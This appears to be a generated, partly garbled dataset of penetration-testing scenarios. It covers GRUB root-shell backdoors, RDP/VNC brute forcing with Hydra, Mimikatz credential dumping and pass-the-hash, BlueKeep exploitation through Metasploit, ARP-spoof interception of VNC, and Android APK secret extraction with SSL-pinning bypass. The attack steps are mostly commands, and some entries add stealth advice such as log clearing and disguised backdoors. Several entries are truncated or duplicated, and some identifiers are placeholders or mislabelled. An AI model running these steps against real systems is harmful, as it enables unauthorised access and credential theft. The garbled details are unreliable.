Solution: • Set GRUB2 password with grub-mkpasswd-pbkdf2• Restrict physical access• Use full disk encryption• Monitor for tampered GRUB entries and init= parameters
Source: Red Team Field Manual, HackTricks, MITRE ATT&CK, Linux Boot Security Docs

Title: Add Custom GRUB Menu Entry for Root Access
Scenario Description: This technique shows how an attacker with physical or root access can create a custom GRUB2 menu entry that boots the system directly into a root shell, bypassing standard user authentication. It leverages the ability to inject new boot options into GRUB's config file, commonly found on unprotected systems with no GRUB password or full disk encryption. This can be used for privilege escalation or persistent boot-level access.
Tools Used: ✅ Root or Live USB access✅ Text editor (nano/vim)✅ Bash shell or terminal✅ Basic Linux commands
Attack Steps:
Step 1: Boot into System with AccessIf root access is available: login normally.If physical access only: boot into a live Linux environment using a USB.Step 2: Mount the Target Root Partition (if using live USB)bash
mkdir /mnt/target
mount /dev/sdX# /mnt/target
Also bind system folders:bash
mount --bind /dev /mnt/target/dev
mount --bind /proc /mnt/target/proc
mount --bind /sys /mnt/target/sys
chroot /mnt/target
Step 3: Locate GRUB Directorybash
cd /etc/grub.d/
Step 4: Create a Custom GRUB Menu EntryCreate a new file:bash
nano 40_custom
Insert the following content:bash
menuentry 'Root Shell Access' {
set root=(hd0,1)
linux /vmlinuz root=/dev/sdX# rw init=/bin/bash
initrd /initrd.img
}
Replace (hd0,1) and /dev/sdX# with the actual device values.Step 5: Regenerate GRUB Configurationbash
update-grub
This updates /boot/grub/grub.cfg to include the new menu entry.Step 6: Reboot and Select New EntryRestart the system and at the GRUB menu select “Root Shell Access”.System will boot directly into a root shell without authentication.Step 7: Optional - Make Entry Stealthy• Rename menu entry to a misleading name (e.g., “Recovery Mode” or “Memory Test”)• Set GRUB timeout to 0 in /etc/default/grub to hide the menu:GRUB_TIMEOUT=0Result: Backdoor access as root on every boot, unless removed.
Vulnerability: No GRUB2 password protectionConfigurable GRUB menu entriesNo disk encryption
MITRE Technique: T1542.003 – Boot or Logon Initialization Scripts
Impact: Root access at bootAuthentication bypassStealth backdoor persistence
Detection Method: Inspect /etc/grub.d/40_custom or /boot/grub/grub.cfg for unauthorized entriesCompare GRUB config hashesMonitor boot parameters
Solution: - Enable GRUB2 password- Use full disk encryption- Limit physical access- Monitor boot config integrity- Restrict write access to /etc/grub.d/
Source: HackTricks, MITRE ATT&CK, GRUB2 Official Docs

Title: Brute Force RDP / VNC Login
Scenario Description: This scenario simulates an attacker attempting to gain unauthorized access to a system through Remote Desktop Protocol (RDP) or Virtual Network Computing (VNC) by brute-forcing user credentials. Common in misconfigured environments where RDP or VNC is exposed to the internet, this technique involves automated attempts using wordlists until a valid username/password pair is found. Weak credentials or lack of lockout policies make this attack feasible.
Tools Used: ✅ Hydra✅ Ncrack✅ Medusa✅ xfreerdp or rdesktop (RDP clients)✅ vncviewer or RealVNC (VNC clients)✅ rockyou.txt / custom wordlist
Attack Steps:
Step 1: Discover Open RDP/VNC PortsUse Nmap to scan target for open ports:bash
nmap -p 3389,5900-5905 -sV
3389 → RDP, 5900–5905 → VNCStep 2: Validate the ServiceFor RDP, confirm connectivity:bash
xfreerdp /u:user /p:pass /v:
For VNC:bash
vncviewer :5900
Step 3: Prepare WordlistsCommon paths:• /usr/share/wordlists/rockyou.txt• Create custom username/password combos (e.g., admin/admin123)Step 4: Run Hydra Against RDPbash
hydra -t 4 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://
Successful login will be shown in output.Alternative Tool (Ncrack for RDP)bash
ncrack -vv --user administrator -P passwords.txt rdp://
Step 5: Brute Force VNC Password (No Username)bash
hydra -P /usr/share/wordlists/rockyou.txt -t 4 vnc
Or:bash
ncrack -vv -P vncpass.txt vnc://:5900
Step 6: Login After SuccessAfter finding valid credentials, log in:bash
xfreerdp /u: /p: /v:
orbash
vncviewer :5900
Access to remote desktop or GUI shell is now achieved.Note: On some systems, successful brute-force RDP login may spawn a desktop session with full user privileges.
Vulnerability: Weak or default credentialsNo account lockoutPublicly exposed RDP or VNC services
Impact: Unauthorized system accessDesktop controlPossible lateral movement
Detection Method: - Monitor failed login attempts on RDP/VNC logs- Use endpoint detection (EDR)- Analyze account login patterns
Solution: - Enforce strong password policies- Enable account lockout- Restrict RDP/VNC via VPN or firewall- Enable MFA- Disable unused remote services
Source: MITRE ATT&CK, HackTricks, Ncrack Manual, Hydra Docs

Title: Anonymous or No-Auth VNC Access
Scenario Description: Some VNC servers (like TightVNC, RealVNC, TigerVNC) may be configured to allow unauthenticated access—either intentionally for convenience or due to misconfiguration. If authentication is disabled, any remote attacker can connect directly and gain control over the GUI desktop. This is particularly dangerous when the VNC server runs as root or is exposed to the internet. Such vulnerabilities are common in legacy systems, testing environments, or poorly configured IT infrastructure.
Tools Used: ✅ vncviewer✅ nmap✅ netcat✅ RealVNC Viewer✅ TightVNC✅ Shodan.io (for discovery)
Attack Steps:
Step 1: Scan for Open VNC PortsUse Nmap to identify VNC ports (typically 5900–5905):bash
nmap -p 5900-5905 -sV
This reveals services like VNC protocol: vnc protocol v3.8 or similar.Step 2: Manual Connection Attempt Without PasswordUse any VNC viewer (e.g., vncviewer) to attempt access:bash
vncviewer :5900
If the connection is accepted without prompting for a password, the server is configured with No Authentication or Blank Password.Step 3: Alternative Tools for Discovery (Optional)Use Shodan or Censys with the following query:port:5900 authentication disabledThis can show publicly exposed systems with no authentication.Step 4: Interact with Remote GUIOnce connected, the attacker can:• View the desktop in real-time• Move the mouse and interact with applications• Execute programs• Open terminals or browsers• Steal clipboard data or screenshots• Install backdoorsStep 5: Confirm Privilege Context (if root)If the VNC server is running as root (common in embedded devices or test machines), the attacker gains full root-level GUI access.Step 6: Optional – Dump Screen for EvidenceRun:bash
ffmpeg -video_size 1024x768 -framerate 1 -f x11grab -i :0.0 output.mp4
Or use screen recording in GUI⚠️ Note: Many VNC clients will silently connect if no authentication is required. You should always ensure the behavior is logged or explicitly monitored.
Target Type: Linux / Windows workstationsIoT or embedded devicesLegacy servers with GUI
Vulnerability: VNC server configured with no authentication or blank password
Impact: Full GUI desktop access without credentialsPotential for privilege escalation, lateral movement
Detection Method: - Monitor for unusual connections on TCP 5900–5905- Check system logs (e.g., /var/log/auth.log)- Use network IDS/IPS for VNC connections
Solution: - Always enable strong authentication on VNC services- Use VPN or SSH tunnels for access- Disable unused remote access tools- Restrict ports using firewalls
Source: MITRE ATT&CK, HackTricks, Nmap Docs, Shodan Intelligence

Title: Credential Reuse via RDP
Scenario Description: In enterprise networks, users often reuse the same password across multiple systems. If an attacker compromises one host and extracts valid RDP credentials (e.g., via LSASS dump, keylogger, or phishing), those credentials can be reused to connect to other machines over Remote Desktop Protocol (RDP). This allows lateral movement, data exfiltration, or privilege escalation, especially when accounts are members of local admins or domain admins.
Tools Used: ✅ Mimikatz✅ xfreerdp / rdesktop✅ crackmapexec✅ Metasploit✅ Windows Remote Desktop (mstsc)
Attack Steps:
Step 1: Obtain Valid Credentials from a Compromised HostFrom an already compromised machine (via phishing, malware, or physical access), extract credentials using tools like:bash
mimikatz
sekurlsa::logonpasswords
This reveals plaintext or hashed credentials of currently logged-in users.Step 2: Identify RDP-Enabled Hosts on NetworkUse tools like Nmap or CrackMapExec to discover hosts with open RDP:bash
nmap -p 3389 -sV
Or:bash
crackmapexec smb -u -p --shares
This lists reachable systems and validates the credentials.Step 3: Attempt RDP Connection with Reused CredentialsIf the credentials are valid, initiate an RDP session:bash
xfreerdp /u: /p: /v:
Or from Windows:Run → mstsc → enter IP and credentialsIf login is successful, attacker gets GUI access to the new host.Step 4: Optional – Escalate Privileges or Exfiltrate DataOnce on the target system:• Check if user is local admin• Install persistence mechanisms (e.g., registry run keys)• Access sensitive files, shared foldersStep 5: Maintain OPSEC and Persistence• Clear event logs if needed• Avoid noisy login patterns• Consider creating shadow accounts if stealth required⚠️ Tip: CrackMapExec can automate credential spraying to multiple systems:bash
crackmapexec rdp -u -p
If accounts are reused across machines, access spreads rapidly.
Vulnerability: Password reuse across multiple machines with RDP enabled
Impact: Lateral movementUnauthorized system accessPrivilege escalation via valid accounts
Detection Method: - Monitor for RDP logins across multiple systems- Check for unusual login patterns- Enable RDP event auditing (event ID 4624, 4625, 4776)
Solution: - Enforce unique passwords across systems- Disable unnecessary RDP access- Implement MFA for remote access- Use account lockout policies
Source: MITRE ATT&CK, HackTricks, Red Team Notes

Title: Session Hijack (Clipboard / Replay)
Attack Type: Session Hijacking via RDP Clipboard or Replay
Scenario Description: In RDP environments, users often copy sensitive content (e.g., passwords, tokens) to or from the clipboard. If clipboard redirection is enabled, attackers with RDP access can monitor or hijack clipboard data. Additionally, session hijacking is possible through replay attacks if credentials or tokens are reused or poorly protected in memory. This technique abuses live or cached session artifacts for lateral movement or privilege escalation.
Tools Used: ✅ Mimikatz✅ Wireshark✅ RDP Clip Monitor✅ RDPY (RDP proxy)✅ Metasploit (Session Sniffing Module)
Attack Steps:
Step 1: Gain Access to a Host with Active RDP SessionUse phishing, social engineering, or stolen credentials to access a machine where an RDP session is running or clipboard redirection is enabled.Step 2: Enable or Monitor Clipboard SharingIf clipboard redirection is enabled, any copy-paste operation is shared across the RDP channel.Check by copying text on host and pasting on attacker's session:CTRL+C → CTRL+VUse PowerShell or registry to verify:powershell
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services' -Name fDisableClipboard
Step 3: Extract Sensitive Clipboard DataInstall or run clipmon (clipboard monitor), or use PowerShell:powershell
Get-Clipboard
If password managers, command output, or tokens were copied, you’ll capture them.Step 4: Attempt Session Replay via Token or CookieUse tools like Mimikatz to extract tokens:bash
mimikatz
sekurlsa::logonpasswords
sekurlsa::tickets
With valid Kerberos tickets or NTLM hashes, try replay or Pass-the-Hash attacks:bash
pth-winexe -U 'DOMAIN\User%HASH' //Target cmd.exe
Step 5: Observe Session Behavior or Hijack GUIWith RDP tools like RDPY (proxy) or VNC injection, an attacker can interact with open sessions without re-authentication, especially if session locking is disabled.Optional – Metasploit Module UsageUse auxiliary modules to dump RDP clipboard:bash
msf> use auxiliary/server/capture/rdp
⚠️ Warning: Session hijack via replay depends on session persistence, token validity, and clipboard access rights.
Vulnerability: Insecure clipboard sharingSession token exposureCredential reuse in memory
Impact: Unauthorized session accessCredential leakageRemote command execution
Detection Method: - Monitor clipboard events- Audit RDP logins and clipboard redirection- Alert on suspicious session replays
Solution: - Disable clipboard redirection- Enforce session locking- Clear session artifacts on logout- Use MFA and token expiry
Source: MITRE ATT&CK, HackTricks, Red Team Notes

Title: BlueKeep – RDP Remote Code Execution
Scenario Description: BlueKeep (CVE-2019-0708) affects unpatched Windows versions running RDP with weak security settings. Attackers can send specially crafted RDP packets to perform unauthenticated remote code execution. This vulnerability has been actively exploited for wormable attacks and ransomware deployment.
Tools Used: ✅ Metasploit (rdp_bluekeep)✅ Nmap with rdp-vuln-cve2019-0708 script✅ Wireshark

Step 1: Scan for Vulnerable HostsRun:bash
nmap -p 3389 --script rdp-vuln-cve2019-0708 If the host is vulnerable, you’ll see STATE: VULNERABLE in the scan output.Step 2: Launch Exploit Modulebash
msf> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
msf> set RHOSTS
msf> run
Step 3: Observe Meterpreter SessionUpon success, you’ll receive a shell:bash
meterpreter > getuid
Check privileges.Step 4: Escalate and PivotRun local privilege escalation, e.g.:bash
run post/windows/escalate/getsystem
Use meterpreter > ps, mimikatz or file exfiltration.Step 5: CleanupClose sessions:bash
sessions -K

Detection Method: - IDS/IPS signatures for BlueKeep- Monitor RDP logs for malformed traffic- SIEM alerts on repeat exploitation attempts
Solution: - Apply Microsoft patches- Disable RDP if not needed- Use RDP Gateways with MFA- Enable network-level authentication (NLA)

Title: TigerVNC Authentication Bypass (CVE-2017-X)
Scenario Description: A vulnerability in some TigerVNC versions allowed attackers to bypass authentication by exploiting a flaw in the challenge/response handshake. No valid credentials are required. The attacker can send altered packets to the VNC server, granting access to the desktop and all active sessions. Presents serious risk in legacy or unmanaged environments.

nmap -p 5900 --script vnc-info Look for TigerVNC 1.7.x.Step 2: Exploit Authentication FlowUse a modified VNC client or intercept with RFBproxy:bash

The session runs under the victim’s context.Step 5: (Optional) Inject Keylogger or BackdoorLaunch a stealthy keylogger or create persistence in ~/.vnc/ or autostart folders.Step 6: Secure and PatchImmediately update TigerVNC to fixed versions and audit other exposed hosts.

Impact: Full desktop accessPrivacy breachPotential for code execution on victim session

Source: CVE database, TigerVNC changelog, MITRE ATT&CK

Title: BlueKeep (CVE-2019-0708) RCE
Scenario Description: BlueKeep affects unpatched Windows systems running RDP with NLA disabled. It enables unauthenticated remote code execution, allowing attackers to gain full control and potentially propagate as a worm. It has been observed in active threat campaigns, making it critical to address.

Use getuid, sysinfo to verify.Step 4: Escalate and ExploreRun run post/windows/escalate/getsystem, use mimikatz, and explore filesystem or registry.Step 5: Clean Up and PatchTerminate sessions (sessions -K), patch the system, and enable NLA to prevent recurrence.

Title: TigerVNC Auth Bypass
Scenario Description: Some versions of TigerVNC incorrectly implement challenge/response authentication, allowing unauthenticated access. Attackers can inject malformed packets into the VNC handshake to bypass password checks and access desktops without credentials. This issue persists in legacy or poorly maintained systems.

Title: Man‑in‑the‑Middle or Sniffed VNC
Scenario Description: In networks without proper encryption or using outdated VNC protocols, an attacker positioned on the same LAN or intercepting traffic (e.g., via ARP spoofing) can capture or modify VNC sessions, extract credentials, screenshots, keystrokes, and potentially inject malicious input into the session. This is especially effective with legacy VNC configurations or over insecure Wi-Fi.
Tools Used: ✅ Wireshark✅ mitmproxy or Bettercap✅ arpspoof, ettercap✅ VNC client (vncviewer)
Attack Steps:
Step 1: Perform ARP Spoofing to Intercept TrafficOn the attacker's machine, run:bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t
arpspoof -i eth0 -t
This places the attacker between the client and server.Step 2: Capture VNC TrafficLaunch packet capture:bash
wireshark &
or:bash
tcpdump -i eth0 port 5900 -w vnc_mitm.pcap
You’ll capture raw RFB protocol packets, including clipboard data, screen updates, and authentication handshakes.Step 3: Analyze Captured Credentials or ScreenshotsOpen the pcap:bash
wireshark vnc_mitm.pcap
Inspect RFB protocol fields for password hashes or unencrypted clipboard content.Screenshots are embedded as image updates.Step 4: Replay or Modify VNC Session TrafficUse Python scripts or vncproxy to replay recorded input or inject commands into the session (e.g., opening terminals, executing payloads).bash
python vnc_replay.py --input capture.pcap --target :5900
Step 5: Launch a Rogue VNC Server (Optional)Redirect victim to a fake VNC server to prompt credentials:bash

Title: Static Analysis of APK to Steal Secrets
Scenario Description: A malicious actor downloads a legitimate Android app's APK file and performs offline static analysis to extract hardcoded secrets such as API keys, tokens, internal URLs, or Firebase credentials. This data can then be used to compromise backend systems or impersonate users. This attack assumes no runtime interaction with the app.
Tools Used: jadx-gui, apktool, MobSF, strings, grep, keytool, base64
Attack Steps: First, obtain the APK by either downloading it from a third-party APK mirror site (like APKPure or APKCombo) or pulling it directly from a connected Android device using the ADB command adb shell pm list packages followed by adb shell pm path <package_name> and adb pull <apk_path>. Next, use apktool d app.apk -o out_dir to decode the APK into smali code and readable resources. Then, open the decompiled folder and navigate through res/values, AndroidManifest.xml, and smali directories. Look for suspicious strings using grep -r 'key|secret|token|firebase' out_dir/. Additionally, open the assets/, raw/, or res/xml/ folders where developers sometimes leave debug config files. Now use jadx-gui app.apk to perform Java-level static code analysis. Inside jadx, navigate through packages like com.example.app.util, com.example.app.auth, or com.example.app.network to locate Java classes that define constants, URLs, and keys. Look for lines like public static final String API_KEY = "AIza..."; or HTTP endpoint strings like https://api.example.com/token. Export those keys and decode any encoded values using base64 -d or an online decoder. Use MobSF for an automated static scan (python3 manage.py runserver for local setup), upload the APK, and check the "Secrets" tab for hardcoded credentials. If Firebase URLs are found (.firebaseio.com), test for open endpoints using a browser or cURL. Finally, if the APK uses ProGuard but isn't obfuscated well, search through the mapping.txt file or analyze class names in JADX that still reveal logic. At this point, the attacker has gathered credentials and internal endpoint information without ever running the app.
Impact: Theft of API keys, abuse of backend services, impersonation of users, exposure of business logic
Detection Method: Mobile static/dynamic code analyzers, build pipeline secret scans, Firebase open database scanners
Solution: Use secret management services (e.g., AWS Secrets Manager), avoid hardcoding keys, enable ProGuard and R8 with proper obfuscation, use NDK for sensitive logic, perform code reviews and secret scans pre-release
Source: Crafted by ChatGPT (OpenAI), aligned to MITRE ATT&CK

Title: Decompile APK to Smali & Java
Scenario Description: An attacker wants to reverse engineer an Android APK to understand its inner workings and inspect for secrets, logic flaws, or vulnerabilities. The attacker decompiles the APK to both Smali (assembly-like) code and Java code for inspection and modification. This is a foundational reverse engineering technique used before tampering or code injection.
Tools Used: apktool, jadx-gui, JADX CLI, Android Studio (optional), unzip, ADB (for APK extraction)
Attack Steps: First, get the target APK either from an emulator/device using adb shell pm list packages to find the package name, then run adb shell pm path <package.name> to get its path, then pull it using adb pull /data/app/com.target.app-1/base.apk. Or download the APK directly from a third-party site like APKMirror. Once you have the APK, copy it to a working directory. For Smali decompilation, run apktool d base.apk -o out_smali which extracts resources and converts bytecode into human-readable Smali code inside out_smali/smali/. Browse Smali files in a code editor (e.g., VS Code). To get the Java source code, use jadx-gui base.apk to open the APK or run jadx -d out_java base.apk for CLI decompilation. Open the output directory to inspect Java code under packages like com/example/app/util. Analyze business logic, extract endpoints, or observe any hardcoded credentials. If ProGuard was not used or not configured properly, class/method names will be easy to read. Optionally, to recompile the APK after editing Smali code, use apktool b out_smali -o modified.apk, then sign it using apksigner sign --ks my-release-key.jks --out signed.apk modified.apk. Now the attacker has fully decompiled the APK, inspected its logic, and optionally modified and repackaged it. These steps allow offline static analysis of both Smali and near-original Java code.
Vulnerability: Insecure Code Distribution, Lack of Obfuscation
Impact: Exposure of application logic, leakage of secrets, tampering risk, vulnerability discovery
Detection Method: Use reverse engineering detection (e.g., tamper checks), track APK repackaging via hash or signature validation
Solution: Use ProGuard/R8 for obfuscation, enforce anti-debug and anti-tamper logic, do not ship production keys, monitor certificate signature mismatch

Title: Bypass Authentication Logic (Login Without Server)
Scenario Description: A vulnerable Android app performs local login verification without server-side validation (e.g., compares username/password against hardcoded strings or shared preferences). An attacker reverse engineers the APK, identifies the login logic, modifies it to bypass checks, recompiles the APK, and logs in without valid credentials.

Step 3: Look for logic like if (inputPassword.equals("admin123")) or shared preference checks like prefs.getString("loggedIn", "false").equals("true"). Detection Method: Reverse engineering, logic diffing, repackaging detection, runtime instrumentation

Title: Disable Root Detection or SSL Pinning
Scenario Description: Some Android apps prevent execution on rooted devices or use SSL pinning to block traffic interception. An attacker bypasses root detection and SSL pinning via static patching (modifying Smali/Java) or using runtime hooking tools like Frida or objection, enabling interception of app traffic or execution on rooted devices.
Tools Used: jadx-gui, apktool, Frida, objection, burp suite, Frida scripts, VS Code
Attack Steps: Step 1: Install the app on a rooted Android emulator or rooted physical device. Step 2: Launch the app—if it crashes or shows root detection, use jadx-gui to inspect the APK. Step 3: Search for root detection keywords like isRooted, checkRoot, su, buildTags, or magisk. Step 4: Find the Java class that checks root (e.g., RootCheck.java) and locate return statements like return true; if root detected. Step 5: Decompile APK to Smali using apktool d app.apk -o out_dir and locate the Smali file (e.g., smali/com/example/app/util/RootUtils.smali). Step 6: Replace const/4 v0, 0x1 (true) with const/4 v0, 0x0 (false) or force bypass by jumping logic. Step 7: Recompile with apktool b out_dir -o no_root.apk and sign with apksigner. Step 8: Reinstall and verify root detection is disabled. For SSL pinning, install Burp Suite and its CA certificate on the emulator. Step 9: Use objection -g com.target.app explore and run android sslpinning disable. Alternatively, use Frida with script like frida -U -n com.target.app -l frida-ssl-bypass.js. Step 10: Launch the app, intercept HTTPS traffic via Burp, and confirm SSL pinning is bypassed. Now you can fully monitor API calls and app functions even on a rooted device.
MITRE Technique: T1613: Container and App Isolation Evasion
Impact: Traffic interception, logic tampering, data theft on rooted devices
